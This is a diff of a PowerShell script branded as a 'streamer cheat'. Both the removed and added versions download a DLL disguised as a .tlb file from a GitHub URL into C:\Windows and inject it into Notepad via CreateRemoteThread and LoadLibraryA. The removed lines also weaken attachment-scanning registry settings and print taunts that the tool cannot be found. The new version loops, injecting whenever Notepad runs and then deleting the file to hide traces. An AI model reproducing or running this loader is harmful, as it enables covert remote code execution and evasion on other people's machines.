@@ -1,11 +1,10 @@
-# Set attachment policy registry keys to suppress warnings (optional)
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord
-
-# Download the DLL and save it
+# Constants
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$MEM_COMMIT = 0x1000
+$MEM_RESERVE = 0x2000
+$PAGE_READWRITE = 0x04
 $dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
 $dllPath = "C:\Windows\ShellJector.tlb"
-Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing
 
 # P/Invoke declarations
 Add-Type @"
@@ -34,65 +33,77 @@ public class Win32 {
 }
 "@
 
-# Constants
-$PROCESS_ALL_ACCESS = 0x001F0FFF
-$MEM_COMMIT = 0x1000
-$MEM_RESERVE = 0x2000
-$PAGE_READWRITE = 0x04
+# Continuous monitoring loop
+while ($true) {
+    # Wait until Notepad is running
+    do {
+        $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+    } while (-not $notepad)
 
-# Start Notepad silently
-$notepad = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
-Start-Sleep -Seconds 2
+    # Download DLL
+    try {
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+        Write-Host "✅ DLL downloaded." -ForegroundColor Green
+    } catch {
+        Write-Host "❌ Failed to download DLL." -ForegroundColor Red
+        continue
+    }
 
-Write-Host "Reconfiguring your Drivers..." -ForegroundColor ColorName -BackgroundColor red 
+    # Inject into each running Notepad process
+    foreach ($proc in $notepad) {
+        $processId = $proc.Id
+        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
 
-# Get Notepad's PID
-$processId = $notepad.Id
-Write-Output "Now Chill Babes . Your pc is successfully Connected With ShivUmang Streamer Cheat!"
+        if ($hProcess -eq [IntPtr]::Zero) {
+            Write-Host "❌ Cannot open Notepad process (PID: $processId)" -ForegroundColor Red
+            continue
+        }
 
-# Open Notepad process
-$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
-if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Error "Failed to open Notepad process."
-    exit
+        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
+        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
+
+        if ($allocMem -eq [IntPtr]::Zero) {
+            Write-Host "❌ Memory allocation failed for PID $processId" -ForegroundColor Red
+            continue
+        }
+
+        $outSize = [IntPtr]::Zero
+        $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$outSize)
+
+        if (-not $writeResult) {
+            Write-Host "❌ Failed to write memory in Notepad (PID: $processId)" -ForegroundColor Red
+            continue
+        }
+
+        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
+        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
+
+        if ($loadLibraryAddr -eq [IntPtr]::Zero) {
+            Write-Host "❌ LoadLibraryA not found." -ForegroundColor Red
+            continue
+        }
+
+        $threadId = [IntPtr]::Zero
+        $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)
+
+        if ($hThread -eq [IntPtr]::Zero) {
+            Write-Host "❌ Thread creation failed for PID: $processId" -ForegroundColor Red
+        } else {
+            Write-Host "✅ DLL injected into Notepad (PID: $processId)" -ForegroundColor Cyan
+        }
+    }
+
+    # Wait a few seconds then delete the DLL
+    Start-Sleep -Seconds 5
+    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+    Write-Host "🧹 DLL deleted. Monitoring continues..." -ForegroundColor Yellow
+
+    # Wait until all Notepad instances are closed
+    do {
+        $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+    } while ($notepad)
+
+    Write-Host "🔁 Notepad closed. Restarting monitor..." -ForegroundColor Gray
 }
-
-# Prepare DLL path
-$bytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)  # null-terminated
-$allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$bytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
-if ($allocMem -eq [IntPtr]::Zero) {
-    Write-Error "Failed to allocate memory."
-    exit
-}
-
-# Write DLL path to memory
-$outSize = [IntPtr]::Zero
-$writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $bytes, [uint32]$bytes.Length, [ref]$outSize)
-if (-not $writeResult) {
-    Write-Error "Failed to write memory."
-    exit
-}
-
-# Get address of LoadLibraryA
-$hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
-$loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
-if ($loadLibraryAddr -eq [IntPtr]::Zero) {
-    Write-Error "Failed to get address of LoadLibraryA."
-    exit
-}
-
-# Create remote thread in Notepad
-$threadId = [IntPtr]::Zero
-$hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)
-if ($hThread -eq [IntPtr]::Zero) {
-    Write-Error "Failed to create remote thread."
-    exit
-}
-
-Write-Output "Ha Ha Kids Checkers Open Challenge No One Can Find It From Your Pc [Dev by ShivUmang]"
-
-
-# Wait 5 seconds before cleanup
-Start-Sleep -Seconds 5
-
-Remove-Item "C:\Windows\ShellJector.tlb" -Force -ErrorAction SilentlyContinue
